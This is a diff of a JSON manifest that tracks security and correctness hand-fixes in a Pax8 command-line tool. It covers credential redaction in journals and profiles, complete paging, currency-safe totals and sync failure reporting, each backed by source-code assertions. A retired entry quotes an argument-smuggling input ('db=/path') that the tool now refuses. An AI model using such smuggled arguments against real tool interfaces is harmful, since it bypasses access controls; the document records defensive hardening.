+  },
+  {
+   "id": "journal-credential-hardening",
+   "class": "secret-persisted",
+   "status": "active",
+   "summary": "The learn journal keeps no text the operator typed in place of a declared name. The PAX8_LEARN_SESSION override is stored as \"o:\" plus the same 64-bit SHA-256 hash the harness session ids get under \"h:\"; argv_shape records only flag names the invoked command declares under exactly the typed name, every other name as the \"<undeclared>\" placeholder, and nothing after \"--\"; failed_flag is never kept as typed; teach.log's missing --query lines record argument counts. Each journal entry is appended whole through credkit.AppendFile, so operator-named text that repeats a credential the program holds is withheld by the kit at the sink (credkit-wiring), no longer by a connector guard.",
+   "why": "Press 4.34.2 (learn/journal.go.tmpl) returns the override raw from JournalSessionKey, so a credential set there is written to journal-*.jsonl on every command, and records every typed flag name, so a credential typed as a flag name (or after --) becomes an argv_shape key and the failed_flag; teach.log records the raw arguments of a teach with no --query. These are names the kit never holds, so they stay hand-fixes (bdd08c08e). Known limits: a guessable override or typed name can be confirmed by hashing guesses; entries an older build wrote stay until the 14-day retention deletes their segment.",
+   "spec_encode_followup": "Press-side: learn/journal.go.tmpl should hash the LEARN_SESSION override as it hashes harness ids, and JournalArgvShape should take the invoked command's declared-flag lookup and record any other name as a placeholder, stopping at \"--\"; the failed flag should be an opaque identity; teach.log should not echo raw arguments.",
+   "asserts": [
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "return \"o:\" + hashHarnessSession(v)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "credkit.AppendFile(p, append(line, '\\n'), 0o600)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "declared := journalFlagDeclared(isBoolFlag, isDeclared)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "entry.FailedFlag = journalOpaqueFailedFlag(entry.FailedFlag, entry.SuggestedFlag)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/pax8_journal_hardening.go",
+     "contains": "const journalUndeclaredFlag = \"<undeclared>\"",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/pax8_journal_hardening.go",
+     "contains": "func journalOpaqueFailedFlag(failed, suggested string) string {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/teach.go",
+     "contains": "writeTeachErrLog(fmt.Sprintf(\"teach: missing --query (%d args, %d resources)\", len(args), len(resources)))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/teach_playbook.go",
+     "contains": "writeTeachErrLog(fmt.Sprintf(\"playbook amend: missing --query (%d args)\", len(args)))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/teach.go",
+     "not_contains": "args=%v"
+    },
+    {
+     "file": "cli/internal/cli/teach_playbook.go",
+     "not_contains": "args=%v"
+    },
+    {
+     "file": "cli/internal/learn/journal_credential_hardening_test.go",
+     "contains": "func TestJournalCredentialHardening(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal_credential_hardening_test.go",
+     "contains": "func TestLearnSinksRefuseHeldCredential(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "all-reads-every-page",
+   "class": "wrong-result",
+   "status": "active",
+   "summary": "--all on a Pax8 list starts at page 0, follows the page block to the last page and reports the true total. A walk that cannot be proven complete is an error, not a short list. The generic 100-page cap does not stop a block walk.",
+   "why": "Adversarial review 2026-11-05, s5_all: an absent page counted as 1, so the second request asked for page=2 and rows 10 to 19 of every list were lost: 15 rows of 25, exit 0. internal/pax8blackbox TestPagingAll* failed before the fix (seen/r1-paging-seen-failing.log) and again with the fix reverted (seen/r1-paging-revert.log).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/helpers.go",
+     "contains": "pageWalk.Page(clean[cursorParam], data, itemCount)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/helpers.go",
+     "contains": "--all could not read every page",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/helpers.go",
+     "contains": "current = \"0\"",
+     "min_count": 2,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/helpers.go",
+     "not_contains": "current = \"1\""
+    }
+   ]
+  },
+  {
+   "id": "export-reads-every-page",
+   "class": "wrong-result",
+   "status": "active",
+   "summary": "export asks for page 0 first with size=200, follows the page block to the last page, and fails rather than writing a partial backup when the walk cannot be proven complete. A resource with fewer rows than one page exports every row.",
+   "why": "Adversarial review 2026-11-05, s12_export: export sent page+1, so it started at page=1: 15 rows of 25, and a resource of 3 rows exported 0, exit 0. internal/pax8blackbox TestPagingExport* failed before the fix (seen/r1-paging-seen-failing.log) and again with the fix reverted (seen/r1-paging-revert.log).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/export.go",
+     "contains": "pageWalk.Page(params[config.cursorParam], data, len(items))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/resource_paths.go",
+     "contains": "params[config.cursorParam] = strconv.Itoa(page)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/resource_paths.go",
+     "not_contains": "strconv.Itoa(page + 1)"
+    },
+    {
+     "file": "cli/internal/cli/resource_paths.go",
+     "contains": "limitParam: \"size\"",
+     "min_count": 5,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/resource_paths.go",
+     "contains": "pax8page.MaxSize",
+     "min_count": 5,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "mcp-list-reaches-every-row",
+   "class": "wrong-result",
+   "status": "active",
+   "summary": "Every Pax8 MCP list tool takes page and size in its schema and returns next_cursor while rows remain, read from the page block. The cursor alone continues the same walk with the size and filters it was minted under; repeating them is allowed, changing them or passing page with it is refused. A page the API answers with the wrong number is a tool error. usage-summaries_usage-lines_find pages like the others.",
+   "why": "Adversarial review 2026-11-05, s8_mcp and s9_mcp_cursor: the cursor only walked the slices of the current API page and page was refused as an unknown argument, so subscriptions_find {size:200} reached 200 of 437 rows and no route led further, while the context tool told agents to pass page. internal/pax8blackbox TestPagingMCP* failed before the fix (seen/r1-paging-seen-failing.log) and again with the fix reverted (seen/r1-paging-revert.log).",
+   "asserts": [
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "{PublicName: \"page\", WireName: \"page\", Location: \"query\"}",
+     "min_count": 10,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "mcplib.WithNumber(\"page\"",
+     "min_count": 10,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "pax8page.Read(data)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "pass page or cursor, not both",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/bound/bound.go",
+     "contains": "if opts.CursorParam == \"page\" && opts.NextCursorPath == \"\" {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/bound/bound.go",
+     "contains": "state.Query = opts.Query",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "novel-money-shapes",
+   "class": "wrong-result",
+   "status": "active",
+   "summary": "spend and mrr share one reading of the money Pax8 documents (internal/cli/pax8_novel_rules.go). spend sums Invoice.total for status Unpaid, Paid and Carried; Void, Nothing Due and Credited are left out and counted; any other status, or none, is left out and reported with its amount. Money is never added across currencyCode: spend has one row per company and currency, and mrr with more than one currency prints null for totals.mrr and totals.margin and one total per currency in totals.byCurrency. spend shows every company unless --limit asks for fewer. mrr reports a margin only over subscriptions that carry partnerCost and counts the rest in subscriptionsWithoutCost; with no cost on any row the margin is null. Invoice.carriedBalance is not subtracted, because the spec examples do not settle whether Invoice.total includes it. overage averages a product within one currency. Under --agent and --compact, mrr, spend, overage, reconcile and since keep every field their rows define (pax8PrintNovelJSON), so a counter on only some rows survives.",
+   "why": "Adversarial review 2026-11-05, reproduced on the binary: spend counted a Void invoice as spend, cut to 25 companies with no notice, and added currencies under the first currency it saw; mrr printed a margin equal to the MRR when partnerCost was absent, which is every documented example. Tests in internal/cli/pax8_money_test.go failed before the fix (seen/r1-class3-seen-failing.log).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/pax8_novel_rules.go",
+     "contains": "func pax8InvoiceOwed(status string) (owed, known bool) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/pax8_novel_rules.go",
+     "contains": "func pax8Currency(row map[string]any) string {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/spend.go",
+     "contains": "owed, known := pax8InvoiceOwed(pax8FieldStr(inv, \"status\"))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/spend.go",
+     "contains": "key := spendKey{cid, pax8Currency(inv)}",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/spend.go",
+     "contains": "cmd.Flags().IntVar(&limit, \"limit\", 0,",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/mrr.go",
+     "contains": "cost, hasCost := pax8FieldNum(s, \"partnerCost\", \"partner_cost\")",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/mrr.go",
+     "contains": "res.Totals.ByCurrency = currencies",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/overage.go",
+     "contains": "pax8UsageAverageKey(s)",
+     "min_count": 2,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/pax8_novel_output.go",
+     "contains": "func pax8PrintNovelJSON(w io.Writer, v any, flags *rootFlags) error {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/mrr.go",
+     "contains": "return pax8PrintNovelJSON(out, ",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/spend.go",
+     "contains": "return pax8PrintNovelJSON(out, ",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/overage.go",
+     "contains": "return pax8PrintNovelJSON(out, ",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/reconcile.go",
+     "contains": "return pax8PrintNovelJSON(out, ",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/since.go",
+     "contains": "return pax8PrintNovelJSON(out, ",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "profile-store-hold",
+   "class": "credential-leak",
+   "status": "active",
+   "summary": "At startup every run profile store a run could mean is read through cliutil.HoldProfileFile: HoldBody holds the declared names at any depth, a value under base-url or token-url goes through credkit.HoldURL, and a value under any other credential's name is held, every member of a duplicate key. A profile's name, its free text and its ordinary values still print.",
+   "why": "Codex round 1, confirmed on the binary: a profiles.json with values base-url https://u:<password>@api.pax8.com/v1 printed the password on profile show. HoldBody does not read base-url, and the TOML parse in HoldConfigFile refuses JSON before HoldURL ran. internal/pax8blackbox TestSavedProfileCredentialsNeverPrint failed before the fix (seen/r1-class4-seen-failing.log).",
+   "asserts": [
+    {
+     "file": "cli/internal/cliutil/credkit_hold.go",
+     "contains": "func HoldProfileFile(path string) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "cliutil.HoldProfileFile(filepath.Join(dir, \"profiles.json\"))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "cliutil.HoldProfileFile(filepath.Join(home, \".pax8-cli\", \"profiles.json\"))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "not_contains": "cliutil.HoldFile(filepath.Join(dir, \"profiles.json\"))"
+    }
+   ]
+  },
+  {
+   "id": "resources-write-order",
+   "class": "wrong-result",
+   "status": "active",
+   "summary": "Every write of a row in the resources table moves that row past every other row (the upsert's DO UPDATE sets rowid to MAX(rowid) + 1). updated_at keeps its format and its whole-second precision, so a record stored under two names reads as the row written last, within one second too, and rows an earlier release wrote still read by updated_at.",
+   "why": "Codex round 1, reproduced against the store: a live read stored usage summary Y under usage-summaries with currentCharges 10, then a sync updated its older subscriptions_usage_summaries row to 90 in the same second. The update kept the older row's smaller rowid, so the stale 10 won and overage missed a 1.8x overage. internal/cli TestSameSecondUsageSummaryWrittenLastWins and internal/store TestUpsertAdvancesTheRowOnEveryWrite failed before the fix (seen/r1-class5-seen-failing.log).",
+   "asserts": [
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "ON CONFLICT(resource_type, id) DO UPDATE SET rowid = (SELECT MAX(rowid) + 1 FROM resources), data = excluded.data",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "sync-failed-dependent-not-success",
+   "class": "wrong-result",
+   "status": "active",
+   "summary": "A dependent whose parent failed, was not readable this run, or was never read counts as failed, not synced, so a sync where everything failed exits non-zero and MCP reports isError. A dependent whose parent was read and really has no rows is still a success. A parent that failed with rows already in the store still gets its children refreshed, and the dependent reports incomplete with nothing pruned. Failed runs keep their counts on stdout for machine callers.",
+   "why": "Adversarial review 2026-11-05, s13_sync_rc: when the token endpoint answered 401, sync exited 0 with errored:6, success:3, total_records:0 and MCP reported no isError, because a dependent with no parent rows counted as a success whatever had happened to its parent. internal/pax8blackbox TestSyncExit* failed before the fix (seen/r1-sync-exit-seen-failing.log) and again with the fix reverted (seen/r1-sync-exit-revert.log).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "parentFailure := dependentParentFailure(c, db, dep, flatOutcomes, userParams)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "return syncResult{Resource: dep.Name, Err: parentFailure, Duration: time.Since(started)}",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "coverageReason = \"parent_not_read\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "its parent %s was never read; sync it first",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "Sync finished with failures: %d records across %d resources",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "sync-reads-every-page",
+   "class": "wrong-result",
+   "status": "active",
+   "summary": "sync asks for size=200 on subscriptions, invoices, products, orders and usage summaries, and on every list it reads on until the page block says the last page was read. A row count never decides the end. A walk that cannot be proven complete (no page block, the wrong page answered, an empty page before the last, rows that do not add up to totalElements, a later page that fails or is not JSON) fails its resource with a non-zero exit, keeps the rows it read, prunes nothing under --full, and clears the resume cursor so the next run starts at page 0.",
+   "why": "Adversarial review 2026-11-05, s1_paging: those five lists sent size=10 and believed a page held 100 rows, so a full page of 10 read as the last page. 437 subscriptions stored as 10 with exit 0, mrr reported 200 instead of 8740, and a plain sync --full pruned a complete store to 10 rows. internal/pax8blackbox TestPagingSync* failed before the fix (seen/r1-paging-seen-failing.log) and again with the fix reverted (seen/r1-paging-revert.log).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "walk.Page(params[pageSize.cursorParam], data, len(items))",
+     "min_count": 2,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "limit:          pax8page.MaxSize",
+     "min_count": 5,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "limitParam:     \"size\"",
+     "min_count": 10,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "db.SaveSyncProgressInScope(resource, scopeKey, \"\", count)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "%s sync incomplete (%s); %d rows stored\", resource, reason, cachedCount), IntegrityFailure: true",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "outcome.reason = \"paging_failed\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "not_contains": "Warn: fmt.Errorf(\"%s sync incomplete (%s)"
+    },
+    {
+     "file": "cli/internal/pax8page/page.go",
+     "contains": "func (w *Walk) Page(requested string, data []byte, rows int) (Step, error)",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
    "id": "sync-event-writer-serialized",
    "class": "concurrent-writer",
    "summary": "sync wraps the event writer its parallel workers share in syncSerialWriter (internal/cli/sync_event_writer.go), so two workers never call Write on it at once.",
@@ -890,6 +1591,33 @@
      "code_only": true
     }
    ]
+  }
+ ],
+ "retired": [
+  {
+   "id": "env-oauth-secrets-not-persisted",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Press 4.34.0 keeps the environment markers through SaveTokens and generates MarkCredentialsExplicit, so a client ID or secret read from the environment is never written by a token save."
+  },
+  {
+   "id": "mcp-filesystem-destination-gate",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Press 4.34.0 builds a per-command blocked set (blockedDestinationFlags, blockedInputFlags, root control-plane flags), removes those flags from each tool's schema, refuses any undeclared argument name (so \"db=/path\" is refused) and skips '=' names in cliArgsFromMCP."
+  },
+  {
+   "id": "mcp-argv-value-joined",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Upstreamed as cli-printing-press #4647: every value-carrying branch of cliArgsFromMCP joins the value to its flag (--k=v, one element per list item), and the press generates TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag."
+  },
+  {
+   "id": "interim-http-security-note-2026-10-22",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: The note paused HTTP mode until a reprint because the build served HTTP with no token. Press 4.34.0 HTTP mode refuses to start without <PREFIX>_MCP_HTTP_TOKEN, answers 401 without the right bearer, binds 127.0.0.1 by default and refuses a non-loopback address without TLS; onboard.py now writes HTTP guidance that follows the binary (cc-skills #14) and never writes this note, so the entry would fail on every re-onboard."
+  },
+  {
+   "id": "mcp-file-flags-refused",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Press 4.34.0's cobratree mirror derives one blocked set per command (destination, input, mcp:write-flags, mcp:read-flags and root control-plane flags), leaves those flags out of the tool schema and refuses them, and any undeclared argument, by name."
   }
  ]
 }
